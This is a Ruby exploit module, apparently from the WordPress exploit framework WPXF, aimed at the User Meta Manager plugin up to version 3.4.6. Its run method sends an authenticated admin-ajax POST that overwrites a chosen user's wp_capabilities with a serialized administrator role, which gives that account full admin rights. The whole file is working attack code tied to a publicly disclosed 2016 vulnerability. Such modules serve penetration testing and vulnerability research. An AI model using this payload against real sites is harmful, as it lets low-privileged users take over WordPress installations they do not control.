# frozen_string_literal: true

class Wpxf::Auxiliary::UserMetaManagerPrivilegeEscalation < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'User Meta Manager <= 3.4.6 Privilege Escalation',
      desc: %(
        The User Meta Manager plugin, up to and including version
        3.4.6, allows authenticated users of any level to update the
        role of any user to be an administrator.
      ),
      author: [
        'Panagiotis Vagenas', # Vulnerability discovery
        'rastating'           # WPXF module
      ],
      references: [
        ['URL', 'http://seclists.org/bugtraq/2016/Feb/34'],
        ['WPVDB', '8379']
      ],
      date: 'Feb 04 2016'
    )

    register_options([
      IntegerOption.new(
        name: 'user_id',
        desc: 'The ID of the user to make an admin',
        required: true
      )
    ])
  end

  def requires_authentication
    true
  end

  def user_id
    normalized_option_value('user_id')
  end

  def check
    check_plugin_version_from_readme('user-meta-manager', '3.4.7')
  end

  def run
    return false unless super

    res = execute_post_request(
      url: wordpress_url_admin_ajax,
      params: {
        'action' => 'umm_switch_action',
        'umm_sub_action' => 'umm_update_user_meta',
        'umm_user' => user_id.to_s
      },
      body: {
        'mode' => 'edit',
        'umm_meta_value[]' => 'a:1:{s:13:"administrator";b:1;}',
        'umm_meta_key[]' => 'wp_capabilities'
      },
      cookie: session_cookie
    )

    if res.code == 200 && res.body =~ /Meta data successfully updated/i
      emit_success "User #{user_id} now has full admin rights"
      return true
    else
      emit_error "Response code: #{res.code}", true
      emit_error "Response body: #{res.body}", true
      emit_error 'Failed to escalate privileges'
      return false
    end
  end
end
